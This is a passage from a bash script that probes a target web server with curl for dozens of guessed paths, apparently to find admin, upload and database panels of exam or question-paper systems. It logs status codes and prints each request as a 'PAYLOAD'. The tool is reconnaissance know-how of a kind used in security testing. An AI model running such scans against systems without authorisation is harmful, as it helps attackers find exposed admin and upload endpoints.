code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataProcessing_QPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["System_QPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"System_QPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUpload-QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUpload-QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSystem-QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSystem-QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handler-QPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handler-QPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadQPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadQPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase-Transfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase-Transfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperPortal/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperPortal/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper_Dashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper_Dashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Manager-QPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Manager-QPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper-Handling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper-Handling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlerQPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlerQPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMasterProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMasterProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Portal_QPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Portal_QPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringQPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringQPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaper_Mgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaper_Mgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulkBatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulkBatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManager_QstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManager_QstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBData_MassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBData_MassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Monitoring_QPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Monitoring_QPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataProcessingQPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataProcessingQPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SyncQPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SyncQPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystem-DataOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystem-DataOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataSyncQPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataSyncQPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPService-Monitoring/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPService-Monitoring/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUpload_QPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUpload_QPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handler-QPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handler-QPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControlPlatform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControlPlatform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin_Admin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin_Admin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaperCloudSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaperCloudSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflow_HandlingModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflow_HandlingModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["System-QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"System-QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ModuleQPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ModuleQPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataProcessing-QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataProcessing-QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch_FileProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch_FileProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["WorkflowQPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"WorkflowQPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPServiceHandling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPServiceHandling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ServiceQstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ServiceQstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TransferQPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TransferQPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandlerModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandlerModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOpsQPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOpsQPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMaster-Sync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMaster-Sync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AdminExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AdminExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AccessControlQPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AccessControlQPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["System-QPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"System-QPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Uploader-TestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Uploader-TestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MassUpload-ExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MassUpload-ExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Ops_QPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Ops_QPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingModuleQPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingModuleQPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBDataSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBDataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystem-Ops/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystem-Ops/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin_DataOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin_DataOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaperAutomationSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaperAutomationSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Tool-QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Tool-QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader-System/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader-System/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessorQPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessorQPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
